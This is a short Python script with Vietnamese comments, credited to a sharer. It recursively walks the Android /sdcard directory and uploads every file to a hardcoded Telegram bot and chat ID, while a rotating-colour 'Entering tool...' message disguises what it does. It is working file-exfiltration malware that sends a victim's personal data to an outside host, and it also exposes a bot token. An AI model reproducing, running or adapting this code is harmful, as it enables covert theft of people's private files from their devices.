# Share By @HgAnh_7

import os
import requests  # Dùng để gửi yêu cầu HTTP tới Telegram Bot API

# Danh sách các màu ANSI để in dòng chữ có màu trong terminal
colors = [
    "\033[1;31m", "\033[1;91m", "\033[1;32m", "\033[1;92m",
    "\033[1;33m", "\033[1;93m", "\033[1;34m", "\033[1;94m",
    "\033[1;35m", "\033[1;95m", "\033[1;36m", "\033[1;96m",
]

# Token của bot Telegram
BOT_TOKEN = "7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc"
# ID của cuộc trò chuyện (channel, group, hoặc người dùng) mà bot sẽ gửi file vào
CHAT_ID = "-1002408191237"
# Địa chỉ API gốc dùng để gọi các phương thức của Telegram Bot
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Biến dùng để xoay vòng màu khi in ra terminal
color_index = 0

# Hàm gửi 1 file đến Telegram bằng cách gọi API trực tiếp
def send_file_to_telegram(file_path):
    global color_index  # Dùng biến toàn cục để đổi màu khi cần
    try:
        with open(file_path, "rb") as f:
            # Gửi file bằng phương thức sendDocument của Telegram
            requests.post(
                f"{API_URL}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": f}
            )
    except Exception as e:
        # Nếu có lỗi thì in thông báo (có màu) lên terminal
        print(colors[color_index] + "Đang vào tool...", end="\r")
    # Đổi sang màu tiếp theo
    color_index = (color_index + 1) % len(colors)

# Hàm quét toàn bộ file trong thư mục và gửi từng file một
def send_all_files_from_directory(directory):
    # Duyệt qua tất cả các file trong thư mục và thư mục con
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            send_file_to_telegram(file_path)  # Gửi từng file

# Gọi hàm gửi toàn bộ file trong thư mục cụ thể (ví dụ: /sdcard trên Android)
send_all_files_from_directory("/sdcard")
